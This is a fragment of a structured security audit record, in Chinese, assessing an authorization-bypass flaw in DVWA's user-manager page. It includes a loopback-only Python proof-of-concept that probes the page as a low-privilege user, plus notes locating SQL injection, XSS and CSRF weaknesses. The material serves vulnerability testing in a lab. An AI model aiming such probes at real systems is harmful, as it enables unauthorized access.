+        "浏览器执行页面脚本以加载表格数据（服务端只输出页面骨架与 JS 调用）。"
+      ],
+      "counterexamples": [
+        "medium/high/impossible 下被包含文件执行 C 第2-6行：非 admin 得到 403、正文 Unauthorised 并 exit，页面不可加载。",
+        "AUTH-001-G 第32-34行使非 admin 的导航菜单不含 authbypass 项，但仅影响可见性。",
+        "若 Web 服务器或框架对 /vulnerabilities/authbypass/ 目录另设 admin 角色限制（本包未提供），直接请求会被拒绝。",
+        "若用户未登录，A 第6行会重定向到 login.php（F 第8-14行），此时是认证拦截而非授权。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n# AUTH-001 F03 draft: page-level access check for vulnerabilities/authbypass/.\n# Read-only, loopback only, no redirect following, credentials from local files.\nimport argparse\nimport http.cookiejar\nimport json\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\nPAGE_PATH = \"/vulnerabilities/authbypass/\"\nPAGE_MARKERS = (\"Vulnerability: Authorisation Bypass\", \"user_table\", \"Welcome to the user manager\")\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        raise urllib.error.HTTPError(req.full_url, code, \"redirect refused: %s\" % newurl, headers, fp)\n\n\ndef build_opener():\n    jar = http.cookiejar.CookieJar()\n    return jar, urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar), NoRedirect())\n\n\ndef normalise_base(base):\n    parts = urllib.parse.urlsplit(base)\n    if parts.scheme not in (\"http\", \"https\"):\n        raise SystemExit(\"--base must start with http:// or https://\")\n    if parts.hostname not in ALLOWED_HOSTS:\n        raise SystemExit(\"only localhost/127.0.0.1/::1 are authorised, got %r\" % (parts.hostname,))\n    return base.rstrip(\"/\")\n\n\ndef read_secret(path):\n    with open(path, \"r\", encoding=\"utf-8\") as handle:\n        value = handle.read().strip()\n    if not value:\n        raise SystemExit(\"secret file %s is empty\" % path)\n    return value\n\n\ndef set_level_cookie(jar, base, level):\n    host = urllib.parse.urlsplit(base).hostname\n    jar.set_cookie(http.cookiejar.Cookie(\n        version=0, name=\"security\", value=level, port=None, port_specified=False,\n        domain=host, domain_specified=False, domain_initial_dot=False,\n        path=\"/\", path_specified=True, secure=False, expires=None, discard=True,\n        comment=None, comment_url=None, rest={}, rfc2109=False))\n\n\ndef login(opener, base, username, password):\n    body = urllib.parse.urlencode(\n        {\"username\": username, \"password\": password, \"Login\": \"Login\"}).encode(\"utf-8\")\n    request = urllib.request.Request(base + \"/login.php\", data=body, method=\"POST\")\n    request.add_header(\"Content-Type\", \"application/x-www-form-urlencoded\")\n    with opener.open(request, timeout=10) as response:\n        return response.status\n\n\ndef fetch_page(opener, base):\n    request = urllib.request.Request(base + PAGE_PATH)\n    request.add_header(\"Accept\", \"text/html\")\n    with opener.open(request, timeout=10) as response:\n        return response.status, response.read().decode(\"utf-8\", \"replace\")\n\n\ndef describe(status, body):\n    return {\n        \"status\": status,\n        \"unauthorised_text\": \"Unauthorised\" in body,\n        \"markers\": {marker: (marker in body) for marker in PAGE_MARKERS},\n        \"length\": len(body),\n        \"snippet\": body[:300].replace(\"\\n\", \" \"),\n    }\n\n\ndef run(base, user, password, level):\n    jar, opener = build_opener()\n    login(opener, base, user, password)\n    set_level_cookie(jar, base, level)\n    status, body = fetch_page(opener, base)\n    return describe(status, body)\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--base\", required=True, help=\"e.g. http://127.0.0.1:8080\")\n    parser.add_argument(\"--user\", required=True, help=\"low-privilege dedicated lab account\")\n    parser.add_argument(\"--password-file\", required=True, help=\"local file with that account password\")\n    parser.add_argument(\"--security\", default=\"low\", choices=[\"low\", \"medium\", \"high\", \"impossible\"])\n    parser.add_argument(\"--control-user\", default=None, help=\"optional admin account for the control request\")\n    parser.add_argument(\"--control-password-file\", default=None)\n    parser.add_argument(\"--out\", default=\"auth001_f03_evidence.json\")\n    args = parser.parse_args()\n\n    base = normalise_base(args.base)\n    password = read_secret(args.password_file)\n\n    try:\n        observed = run(base, args.user, password, args.security)\n    except urllib.error.HTTPError as exc:\n        print(\"low-privilege page request: HTTP %s\"% exc.code)\n        return 2\n    except urllib.error.URLError as exc:\n        print(\"connection error: %s\" % exc.reason)\n        return 2\n\n    print(\"low_privilege: status=%s unauthorised=%s markers=%s\"\n          % (observed[\"status\"], observed[\"unauthorised_text\"], observed[\"markers\"]))\n\n    control = None\n    if args.control_user and args.control_password_file:\n        control_password = read_secret(args.control_password_file)\n        try:\n            control = run(base, args.control_user, control_password, args.security)\n            print(\"control: status=%s unauthorised=%s markers=%s\"\n                  % (control[\"status\"], control[\"unauthorised_text\"], control[\"markers\"]))\n        except (urllib.error.HTTPError, urllib.error.URLError) as exc:\n            print(\"control request failed, continuing: %s\" % exc)\n\n    evidence = {\"target\": base, \"security\": args.security,\n                \"low_privilege\": observed, \"control\": control}\n    with open(args.out, \"w\", encoding=\"utf-8\") as handle:\n        json.dump(evidence, handle, ensure_ascii=False, indent=2)\n    print(\"evidence=%s\" % args.out)\n\n    served = observed[\"status\"] == 200 and not observed[\"unauthorised_text\"] and observed[\"markers\"].get(\"user_table\")\n    if served:\n        print(\"RESULT: the user-manager page body was served to a non-admin principal\")\n        return 0\n    if observed[\"unauthorised_text\"] or observed[\"status\"] in (401, 403):\n        print(\"RESULT: the page rejected this principal under this condition\")\n        return 1\n    print(\"RESULT: inconclusive; inspect the saved evidence\")\n    return 1\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+，仅标准库（argparse、json、urllib、http.cookiejar）",
+          "本地授权的 DVWA 实例（PHP + MySQL），可通过 127.0.0.1 访问",
+          "一个专用普通用户账号；可选 admin 账号用于对照"
+        ],
+        "parameters": [
+          "--base：靶场基址，仅接受 localhost/127.0.0.1/::1",
+          "--user / --password-file：普通用户账号与本地口令文件",
+          "--security：low/medium/high/impossible，默认 low",
+          "--control-user / --control-password-file：可选 admin 对照账号",
+          "--out：证据 JSON 输出路径"
+        ],
+        "steps": [
+          "启动本地靶场，确认已登录用户可切换 security 等级。",
+          "以普通用户运行脚本（默认 security=low），请求 /vulnerabilities/authbypass/，记录状态码、是否含 Unauthorised、是否含 user_table。",
+          "以 admin 账号重跑同一请求作为正常对照，预期 200 且含表格容器。",
+          "把 --security 改为 medium 或 impossible 重跑普通用户请求，预期 403/Unauthorised，作为该条件下的反例。",
+          "保存证据 JSON；如需继续验证接口影响，转到 F01/F02 的草案。"
+        ],
+        "expected_observation": "security=low 时普通用户 GET 返回 200，正文含 'Vulnerability: Authorisation Bypass' 与 'user_table'，不含 'Unauthorised'；medium/high/impossible 下同一请求返回 403 且正文为 'Unauthorised'；admin 在各等级均应 200。",
+        "success_criteria": "同一 URL、同一方法下，admin 得到 200+表格容器，而普通用户在 low 也得到 200 且不含 Unauthorised、含 user_table，即页面级角色检查未生效。普通用户得到 403/Unauthorised 或跳转登录页则不成立。",
+        "limitations": [
+          "未在本次环境运行，execution_status=未运行；脚本仅为草案。",
+          "页面表格由 JS 动态生成，脚本只能证明服务端返回了页面骨架；“看到全部用户数据”需由 F02 的接口请求单独证明。",
+          "low.php 等 source 文件的真实内容未提供，本候选依赖包内明示的“low 无额外执行语句”条件。",
+          "登录是否需 CSRF token 需按实际版本人工核对。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [
+    {
+      "fragment_id": "AUTH-001-E",
+      "line_start": 11,
+      "line_end": 11,
+      "quote": "if (dvwaSecurityLevelGet() == \"impossible\" && dvwaCurrentUser() != \"admin\") {"
+    },
+    {
+      "fragment_id": "AUTH-001-D",
+      "line_start": 10,
+      "line_end": 10,
+      "quote": "if ((dvwaSecurityLevelGet() == \"high\" || dvwaSecurityLevelGet() == \"impossible\") && dvwaCurrentUser() != \"admin\") {"
+    },
+    {
+      "fragment_id": "AUTH-001-C",
+      "line_start": 2,
+      "line_end": 6,
+      "quote": "if (dvwaCurrentUser() != \"admin\") {"
+    }
+  ],
+  "missing_context": [
+    "vulnerabilities/authbypass/source/low.php、medium.php、high.php、impossible.php 的完整源码未提供，仅给出被包含的角色检查片段 C；low 等级无检查这一点来自包内文字条件，无法逐行引用 low.php。",
+    "dvwa/includes/dvwaPage.inc.php 未提供：dvwaPageNewGrab、dvwaRedirect、dvwaDatabaseConnect、session_start 的调用时机与其它 include 未知。",
+    "AUTH-001-D/E 内部均无 dvwaPageStartup 调用，但 dvwaPage.inc.php 是否隐式建立会话或强制登录未知，因此匿名可达性无法静态确定。",
+    "实际部署的 security 等级来源（Cookie、default_security_level、disable_authentication）与普通用户能否自行切换等级未提供。",
+    "users 表结构（user_id/first_name/last_name 的列名与类型）、admin 与普通用户的实际 user_id 映射未提供。",
+    "登录流程（表单字段、是否需要 user_token）、会话 Cookie 名称与有效期未提供。",
+    "AUTH-001-A 第70行引用的 $html 在本片段内未定义，其内容与来源（可能由第33行包含的 source 文件提供）未提供。",
+    "源提交号、PHP/MySQL 版本、Web 服务器与 rewrite 规则未提供。"
+  ],
+  "risk_notes": [
+    "范围外（SQL 注入）：AUTH-001-E 第47行用字符串拼接构造 UPDATE，$data->first_name、$data->surname、$data->id 均未参数化，第48行直接把 mysqli 错误输出到响应；本样本只评估权限一致性，不据此计入越权指标。",
+    "范围外（XSS）：AUTH-001-B 第45/47行把接口返回的 first_name/surname 直接拼进 innerHTML，页面又用 innerHTML 渲染表格，存在存储型/DOM 型脚本注入候选。",
+    "范围外（输出编码不一致）：AUTH-001-D 第22-29行仅在 impossible 分支使用 htmlspecialchars，low/medium/high 原样输出姓名，与上一条 XSS 候选相关。",
+    "范围外（CSRF）：AUTH-001-E 只校验 POST 方法与 JSON 格式，无 CSRF token；即使补齐角色校验，跨站请求仍可能借管理员浏览器触发修改。",
+    "范围外（等级由客户端控制）：AUTH-001-F 第32-33行 security 等级优先取自客户端 Cookie；若产品语义要求等级由服务端强制，这属于独立的设计风险。",
+    "范围外（错误信息泄露）：AUTH-001-E 第48行在查询失败时输出数据库错误详情。"
+  ],
+  "quality_notes": [
+    "AUTH-001-G 第84-85行把 $securityLevelHtml 连续赋值两次，第85行直接覆盖前一次赋值，属重复代码。",
+    "AUTH-001-D 第18行 $guestbook 声明后未使用；AUTH-001-A 第15行 $method 赋值后在本片段内未使用。",
+    "AUTH-001-D/E 使用 mysqli 过程式接口并经 $GLOBALS[\"___mysqli_ston\"] 取连接，属旧式写法。",
+    "AUTH-001-A 第70行使用未在本片段定义的 $html，页面 body 的拼接依赖外部包含文件的副作用，可读性差。",
+    "AUTH-001-D 第10行与 AUTH-001-E 第11行重复调用 dvwaSecurityLevelGet()，且两处等级集合不一致（D 为 high/impossible，E 仅 impossible），易产生配置理解偏差。"
+  ],
+  "limitations": [
+    "全部结论为静态代码判断，本次未运行任何请求，verdict 保持待验证，不能升级为确认。",
+    "页面级候选（F03）依赖包内明示的“low 版本无额外执行语句”，未提供 low.php 原文。",
+    "D/E 是否在匿名条件下可达，取决于未提供的 dvwaPage.inc.php 与部署配置。",
+    "POC 均为需人工适配的草案，参数、登录字段与 security 设置方式需按实际部署核对；未保存脚本文件，artifact_path 为 null。",
+    "本输出只覆盖权限越权范围；SQL 注入、XSS、CSRF 仅作为范围外风险记录，不进入本样本的越权指标。"
+  ],
+  "runtime_evidence": []
+}
